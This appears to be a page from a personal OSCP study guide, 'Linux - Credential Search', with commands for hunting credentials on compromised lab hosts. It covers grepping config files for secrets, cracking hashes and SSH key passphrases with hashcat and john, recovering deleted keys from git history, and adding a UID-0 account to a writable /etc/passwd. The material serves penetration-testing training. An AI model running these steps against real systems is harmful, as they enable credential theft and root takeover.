# Linux - Credential Search

**Step 17 of 50 · Linux**

*Search application and user files for passwords, hashes, and reusable connection details.*

Fast syntax reference: [[OSCP COMMAND MASTER CHEATSHEET|OSCP Command Master Cheatsheet]] · Use this page for evidence handling and validation decisions; use the cheatsheet for compact command syntax.

## Run this

> **Why:** This filter extracts readable evidence from the saved output so likely credentials or configuration clues can be validated.
```bash
grep -rniE 'password|passwd|pwd|secret' /var/www /opt /home 2>/dev/null
find /var/www /opt /home -name '.env' -o -name 'wp-config.php' 2>/dev/null
```

## Application-encrypted credentials

Configuration files and database rows can hold credentials that are not immediately readable. Save the application key, encrypted field, and implementation details privately before attempting decryption. If the application source names the primitive, reproduce its nonce, associated-data, encoding, and key handling exactly.

> **Why:** This preserves the evidence chain from readable configuration to a recoverable secret without treating an encrypted value as a failed credential.
```bash
grep -RniE 'key|crypt|encrypt|decrypt|nonce|secret|password' /opt /var/www 2>/dev/null
grep -RniE 'sodium_crypto|openssl_decrypt|base64_decode' /opt /var/www 2>/dev/null
```

If a database contains the encrypted field, go to Step 18 · [[Linux - Database Access]] first, then return here with the exact field and application key. Keep the decrypted result in private loot and validate it once against the most likely service.

## Example output

```

/var/www/app/.env:DB_PASSWORD=REDACTED
/opt/app/config.php:password = REDACTED
...
```
Also check:

> **Why:** This SSH connection tests the recovered credential or reaches a legacy daemon using the compatibility options it requires.
```bash
# Writable /etc/passwd — can add a root-equivalent account
ls -la /etc/passwd
openssl passwd -1 password123   # generate a password hash

# SSH keys in user home directories
find /home /root -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null
```

## What did you get?

- [ ] A cleartext credential is found → **Run `ssh $Username@$BoxIP` or submit the credential to the identified application once, then record whether it succeeds**
- [ ] A hash is found → **Run `hashcat -m 0 $BoxDir/loot/hash.txt /usr/share/wordlists/rockyou.txt`, then go to Step 18 · [[Linux - Database Access]] with the recovered value**
- [ ] A database configuration is found → **Go to Step 18 · [[Linux - Database Access]]**
- [ ] `/etc/passwd` is world-writable → **Run `openssl passwd -1`, append the generated hash in a UID-0 entry to `/etc/passwd`, then run `su $Username2`**
- [ ] An SSH private key is found → **Set `$KeyFile` to the discovered key path, then run `cp $KeyFile $BoxDir/loot/id_rsa && chmod 600 $BoxDir/loot/id_rsa && ssh -i $BoxDir/loot/id_rsa $Username@$BoxIP`**
- [ ] Nothing useful is found → **Go to Step 19 · [[Linux - Kernel Exploit]]**
- [ ] An application key and encrypted credential field are found → **Save both privately, inspect the implementation, and go to Step 18 · [[Linux - Database Access]] before a controlled service validation**

## Notes

Inspect config files without printing private values into the transcript.

## Gotcha

> [!warning] 💡
> Search output can contain credentials. Save it to private loot and redact screenshots.

> [!warning] 💡
> A writable `/etc/passwd` is unusual but decisive. Confirm it is world-writable (`-rw-rw-rw-`) before attempting the edit. If you write a malformed entry the file is still valid — only the new entry is broken, not the original accounts.

## Writable `/etc/passwd`

Use this branch when the file is owned by your account or writable by your group. `/etc/passwd` maps usernames to UIDs; a new entry with UID 0 receives root privileges when selected with `su`.

> **Why:** This check shows the owner and permission bits on `/etc/passwd`; look for write permission for your user or one of your groups.
```bash
ls -la /etc/passwd
```

> **Why:** This Kali-side command creates a password hash for the controlled account; the hash is placed into the file entry rather than recorded in notes.
```bash
openssl passwd -1 $Password
```

> **Why:** This target-side append creates a new account whose UID and GID are both 0; success is a valid new line followed by a successful `su` login.
```bash
# Substitute the generated hash and controlled username privately before running.
echo "$Username2:$Hash:0:0:root:/root:/bin/bash" >> /etc/passwd
su $Username2
```

## Additional routing

- [ ] `/etc/passwd` is writable and the new account becomes UID 0 → **Confirm identity, then continue to Linux clean-down**
- [ ] Only group write is present → **Check group membership and retry only if the current user can write**
- [ ] The file is not writable → **Continue with Step 18 · [[Linux - Database Access]] or Step 19 · [[Linux - Kernel Exploit]]**
## Repeatedly encoded credential backups

When a web endpoint returns a long encoded value, preserve the raw response and decode it mechanically. This avoids terminal wrapping, copy errors, and accidental exposure in the transcript.

```bash
curl -s "http://$BoxIP/$Path" -o "$BoxDir/loot/$BackupFile"
python3 - "$BoxDir/loot/$BackupFile" "$BoxDir/loot/$DecodedFile" <<'PY'
import base64, sys
from pathlib import Path
src, dst = map(Path, sys.argv[1:])
lines = src.read_bytes().splitlines()
value = b"".join(lines[2:])
decoded_layers = 0
while decoded_layers < 20:
    try:
        value = base64.b64decode(value)
    except Exception:
        break
    decoded_layers += 1
dst.write_bytes(value)
print(f"decoded {decoded_layers} layers; result saved privately")
PY
```

> [!warning] 💡
> The `lines[2:]` offset is application-specific. Confirm the response layout first. Never print the decoded result into a shared log or screenshot.

## Additional routing

- [ ] A decoded credential is recovered → **Set `$Username` and `$Password` privately, validate SSH or the identified service once, then continue with local enumeration**

## Encrypted SSH key workflow

When an application exposes an encrypted private key, convert the key's encryption metadata for John before attempting repeated guesses. `ssh2john` creates a crackable representation; the original key remains the input for the later SSH connection.

> **Why:** These commands prepare the discovered key, crack its passphrase with the standard Kali wordlist, and use the result for SSH validation.
```bash
ssh2john $KeyFile > $HashFile
john $HashFile --wordlist=/usr/share/wordlists/rockyou.txt
ssh -i $KeyFile $Username@$BoxIP
```

> [!warning] 💡
> Keep the key, John hash, and recovered passphrase in private loot. Do not print them into a report or screenshot.

## Compiled application artifacts

Custom JARs, binaries, and packaged application files may contain hard-coded credentials that are not visible in the web page source. Preserve the original and save every analysis result under the temporary box directory.

~~~bash
mkdir -p "$BoxDir/loot/binary-analysis"
cp "$BoxDir/loot/$File" "$BoxDir/loot/binary-analysis/$File.original"
file "$BoxDir/loot/$File"
jar tf "$BoxDir/loot/$File" | tee "$BoxDir/loot/binary-analysis/jar-contents.txt"
javap -classpath "$BoxDir/loot/$File" -c -p "$ClassName" \
  | tee "$BoxDir/loot/binary-analysis/$ClassName.javap.txt"
~~~

~~~bash
grep -Ein 'user|username|pass|password|secret|token|jdbc|mysql|postgres|localhost' \
  "$BoxDir/loot/binary-analysis/$ClassName.javap.txt"
~~~

Treat the recovered value as a candidate, not proof. Validate it once against the account or service suggested by the evidence, record the result, and avoid broad password spraying.

## Git history and deleted secrets

When a foothold exposes a Git repository, search all reachable commits. A key or configuration file removed from the working tree may remain in an older snapshot and may still be accepted by a service.

```bash
boxset GitRepo "$HOME/work/blogfeed"
git -C "$GitRepo" log --oneline --all
git -C "$GitRepo" log --all --stat
boxset Commit "$CommitId"
boxset HistoryPath "resources/integration/authcredentials.key"
boxset HistoryKeyFile "$BoxDir/loot/${AdminUser}_history.key"
git -C "$GitRepo" show "$Commit:$HistoryPath" > "$HistoryKeyFile"
chmod 600 "$HistoryKeyFile"
ssh-keygen -y -f "$HistoryKeyFile" > /dev/null
```

If the repository is on the target and the extracted file is not suitable for local `git show`, use a controlled SSH command to redirect the historical blob into private Kali loot:

```bash
ssh -o IdentitiesOnly=yes -i "$KeyFile" "$Username@$BoxIP" \
  "git -C '$GitRepo' show '$Commit:$HistoryPath'" > "$HistoryKeyFile"
chmod 600 "$HistoryKeyFile"
ssh-keygen -y -f "$HistoryKeyFile" > /dev/null
```

The useful proof is a successful key-format check followed by one controlled authentication test. Do not print the key or place it in a report.

## Seen in

- [[OSCP/BOXES/WRITE UPS/Linux/Blocky|Blocky]] -- a custom Minecraft plugin JAR contained a hard-coded database credential that was reused for SSH
- [[OSCP/BOXES/WRITE UPS/Linux/Snookums|Snookums]] -- confirmed in the box write-up
- [[OSCP/BOXES/WRITE UPS/Linux/OpenAdmin|OpenAdmin]] -- ONA configuration credential reuse and encrypted SSH key passphrase cracking
- [[OSCP/BOXES/WRITE UPS/Linux/Poison|Poison]] -- repeatedly encoded web backup decoded mechanically and validated for SSH access
- [[OSCP/BOXES/WRITE UPS/Linux/Covfefe|Covfefe]] -- encrypted RSA key converted with `ssh2john` and cracked offline with John
- [[OSCP/BOXES/WRITE UPS/Linux/Valentine|Valentine]] -- hex-decoded encrypted RSA key was validated with passphrase context recovered through Heartbleed
- [[OSCP/BOXES/WRITE UPS/Linux/Traverxec|Traverxec]] -- readable `.htpasswd` record and encrypted SSH backup led to two private offline cracking steps
- [[OSCP/BOXES/WRITE UPS/Linux/SolidState|SolidState]] -- POP3 mailbox retrieval exposed the SSH credential and sensitive values were kept in private loot
- [[OSCP/BOXES/WRITE UPS/Linux/DevOops|DevOops]] -- XXE disclosed an SSH key, then Git history exposed an older integration key used for root SSH validation
- [[OSCP/BOXES/WRITE UPS/Linux/Mirai|Mirai]] -- product fingerprinting led to one private factory-credential validation against SSH; the credential value was not recorded
- [[OSCP/BOXES/WRITE UPS/Linux/Management|Management]] -- GLPI configuration exposed the database key and the database exposed an application-encrypted LDAP secret; implementation review recovered the correct nonce and associated-data handling

## Related stages

- [[Linux - Service Scan]]
- [[Linux - Web Enum]]
- [[Linux - Local Enum]]
- [[Linux - Clean Down]]
- [[Linux - Exploit Search]]

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
